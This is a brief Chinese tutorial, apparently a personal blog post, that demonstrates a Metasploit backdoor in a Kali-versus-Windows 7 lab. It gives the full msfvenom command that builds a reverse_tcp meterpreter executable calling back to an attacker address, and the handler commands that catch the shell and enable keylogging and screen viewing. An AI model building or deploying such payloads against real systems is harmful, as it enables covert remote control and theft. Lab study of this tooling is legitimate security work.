# metasploit---后门使用

keywords: metasploit msf msfvenom 反向连接  

metasploit是很强大的渗透工具，这里做后门简单演示  

准备2台机器：kali和win7  
kali预装了metasploit，扮演攻击者，win7扮演受害者  


在kali下使用msfvenom生成恶意文件：  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.2 LPORT=8080 -a x86 -f exe -o hello.exe
```
注：每次生成都会有区别，不是完全一致的  

kali监听本机8080端口：  
```bash
msfconsole
# 启动后执行以下命令
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 8080
    exploit
```

windows执行hello.exe之后，kali即可获取shell  

获取shell后，可执行任意命令，还有各种封装好的功能，如键盘记录、查看屏幕等  


2021/4/20  
